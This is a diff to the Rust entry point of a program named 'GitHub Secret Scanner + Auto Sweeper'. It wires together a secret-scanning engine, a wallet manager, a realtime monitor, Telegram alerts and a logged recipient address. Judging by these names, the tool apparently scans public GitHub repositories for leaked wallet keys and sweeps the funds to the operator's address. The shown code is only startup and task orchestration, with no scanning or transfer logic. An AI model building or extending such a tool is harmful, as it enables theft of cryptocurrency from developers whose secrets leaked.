@@ -10,7 +10,7 @@ mod monitor;
 mod models;
 
 use std::sync::Arc;
-use tracing::{info, warn};
+use tracing::{info, warn, error};
 use dotenv::dotenv;
 
 #[global_allocator]
@@ -29,7 +29,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .with_line_number(true)
         .init();
 
-    info!("🚀 Starting GitHub Secret Scanner...");
+    info!("🚀 Starting GitHub Secret Scanner + Auto Sweeper...");
     
     // Load configuration
     let config = config::Config::from_env()?;
@@ -39,14 +39,89 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     info!("📡 Poll interval: {} seconds", config.poll_interval_secs);
     info!("👛 Recipient address: {}", config.recipient_address);
     
-    // Initialize components (placeholder for now)
-    // Will be implemented in next files
+    // Initialize cache
+    let cache = core::cache::CacheManager::new();
     
-    info!("🔧 Starting scanner engine...");
+    // Initialize database
+    let db = match database::mongo::MongoDB::new(
+        &config.mongodb_uri,
+        &config.mongodb_db,
+    ).await {
+        Ok(db) => {
+            info!("✅ MongoDB connected");
+            db
+        }
+        Err(e) => {
+            error!("❌ MongoDB connection failed: {}", e);
+            return Err(e);
+        }
+    };
     
-    // Keep alive
+    let db_ops = Arc::new(database::ops::DatabaseOps::new(db.clone()));
+    
+    // Initialize wallet manager
+    let wallet_manager = match wallet::manager::WalletManager::new(config.clone()) {
+        Ok(wm) => {
+            info!("✅ Wallet manager initialized");
+            Arc::new(wm)
+        }
+        Err(e) => {
+            error!("❌ Wallet manager initialization failed: {}", e);
+            return Err(e);
+        }
+    };
+    
+    // Initialize telegram alerts
+    let telegram = match telegram::alerts::TelegramAlerts::new(config.clone()) {
+        Ok(ta) => {
+            info!("✅ Telegram alerts initialized");
+            Arc::new(ta)
+        }
+        Err(e) => {
+            error!("❌ Telegram initialization failed: {}", e);
+            return Err(e);
+        }
+    };
+    
+    // Initialize scan engine
+    let scan_engine = scanner::engine::ScanEngine::new(
+        config.clone(),
+        cache.clone(),
+    );
+    
+    info!("🔧 Starting scan engine...");
+    
+    // Start scan engine
+    let scan_handle = tokio::spawn(async move {
+        scan_engine.run().await;
+    });
+    
+    // Initialize realtime monitor
+    let monitor = monitor::realtime::RealtimeMonitor::new(
+        config.clone(),
+        db_ops.clone(),
+        telegram.clone(),
+        wallet_manager.clone(),
+    );
+    
+    info!("🔄 Starting realtime monitor...");
+    
+    // Start monitor
+    let monitor_handle = tokio::spawn(async move {
+        monitor.run().await;
+    });
+    
+    info!("✅ All systems running. Press Ctrl+C to stop.");
+    
+    // Wait for shutdown signal
     tokio::signal::ctrl_c().await?;
     warn!("🛑 Shutting down...");
+    
+    // Abort tasks
+    scan_handle.abort();
+    monitor_handle.abort();
+    
+    info!("👋 Goodbye!");
     
     Ok(())
 }
